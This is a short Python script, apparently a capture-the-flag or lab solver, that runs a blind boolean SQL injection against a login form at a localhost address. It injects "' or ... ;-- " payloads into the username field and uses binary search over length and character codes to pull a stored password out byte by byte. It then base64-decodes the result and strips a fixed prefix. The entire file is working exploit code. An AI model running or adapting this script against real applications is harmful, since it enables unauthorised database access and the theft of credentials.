import requests
import string
import os
import sys
import time
from base64 import b64decode

# setting globals and vars
sess = requests.Session()
cookies = []
BIN_QUERY = "' or {} {} {};-- "
MAX_LENGTH = 100
MAX_CHAR_VALUE = 2 ** 7 - 1  # 7 bit ascii is bae



#############################
#      USER PARAMS HERE     #                     
#############################
url = 'http://127.0.0.1:9001'
resp = 'Welcome'
type = 'sql'
dict = string.printable

 
def get_query_result(data):
    time.sleep(0.1)
    payload = {'username': data, 'password':'asdf'}
    r = sess.post(url, data=payload)
    res = r.text
    return resp in res
 
def bin(query,sl,sh):
    searchlow = sl
    searchhigh = sh
    searchmid = 0
    while True:
        searchmid = (searchlow + searchhigh) // 2
        if get_query_result(BIN_QUERY.format(query, "=", searchmid)):
            break
        elif get_query_result(BIN_QUERY.format(query, ">", searchmid)):
            searchlow = searchmid + 1
        elif get_query_result(BIN_QUERY.format(query, "<", searchmid)):
            searchhigh = searchmid
    return searchmid

def querylength(query):
    return bin("length(({}))".format(query),0,MAX_LENGTH)

def binsearch(query):
    fulltext = ""
    qlen = querylength(query) + 1
    print("length: {}".format(qlen-1))
    
    payloads = {"sqli":"unicode(substr(({}),{},1))", 
                "sql":"ord(substring(({}),{},1))"}
    a = ""
    sys.stdout.write(query + ": ")
    for i in range(1,qlen):
        c = chr(bin(payloads[type].format(query,i),0,MAX_CHAR_VALUE))
        a += c
        sys.stdout.write(c)
        sys.stdout.flush()
    print()
    return a

if __name__ == "__main__":
    password = binsearch("password")
    print(b64decode(password)[len("buzzislife"):])


